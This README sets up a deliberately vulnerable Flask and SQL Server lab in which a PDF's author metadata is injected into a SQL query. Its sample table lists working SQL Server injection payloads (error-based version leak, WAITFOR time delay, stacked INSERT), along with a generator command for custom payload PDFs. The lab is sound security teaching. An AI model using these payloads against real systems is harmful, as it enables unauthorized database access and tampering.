# PDF Metadata SQL Injection — Lab

An educational lab that reproduces a **SQL injection carried through the metadata
of a PDF file**. A small document management app ("DocIndeX") reads the author
from an uploaded PDF's metadata and stores it in a database, concatenating the
value straight into the query.

The backend is **Microsoft SQL Server**.

Full write-up: [https://medium.com/@leonardospinelli_14848/sql-injection-through-pdf-metadata-c74a59210bc6]

> ⚠️ Intentionally vulnerable app. Run it only in a local, isolated environment.

---

## Running the lab

```bash
docker compose up --build
```

Then open **http://localhost:5000**.

Two containers start: the Flask app and a SQL Server instance. On first boot SQL
Server takes ~20–40 seconds to become ready; the app waits for it automatically.

### Vulnerable / protected toggle

The app starts in **vulnerable** mode. For the fixed version (parameterized
queries) set the environment variable in `docker-compose.yml`:

```yaml
environment:
  VULNERABLE: "false"
```

The page footer always shows the active mode.

---

## Layout

```
.
├── app/
│   ├── app.py            # Flask app: naive parser + query (vuln/fix via toggle)
│   ├── templates/
│   ├── static/
│   └── requirements.txt
├── tools/
│   ├── gen_pdf.py        # builds PDFs with a controlled /Info (single /Author)
│   └── incremental_demo.sh   # shows the incremental-update problem
├── samples/              # ready-to-use payload PDFs
├── Dockerfile
└── docker-compose.yml
```

---

## Usage

Upload a PDF from the web page. The app reads its `/Author` metadata and stores
it. Ready-made PDFs are in `samples/`:

| File | `/Author` payload | What it does |
| --- | --- | --- |
| `00_clean.pdf` | `izzy` | baseline, no injection |
| `01_breakout.pdf` | `x'` | triggers a SQL error, confirms the injection |
| `exploit-sql-error-based.pdf` | `x'); SELECT CAST(@@version AS INT);--` | leaks the DBMS version in the error |
| `exploit-sql-blind.pdf` | `x'); WAITFOR DELAY '0:0:12'--` | ~12 s delay, blind confirmation |
| `exploit-stacked-insert.pdf` | `x'); INSERT ... VALUES ('pwned','INJECTED');--` | writes a new row in the DB |

Build your own payloads with:

```bash
python3 tools/gen_pdf.py "x'); <your payload>--" -o samples/custom.pdf
```

To see the incremental-update problem (why a payload set with `exiftool` can be
ignored), run:

```bash
bash tools/incremental_demo.sh
```

The write-up explains what each step means and why it works.

---

## Purpose & license

This project exists for education and defensive research. It is intentionally
vulnerable and must only be run in a local, isolated environment. Do not deploy
it on a public or shared host, and do not use these techniques against systems
you are not authorized to test.

Released under the MIT License (see `LICENSE`).
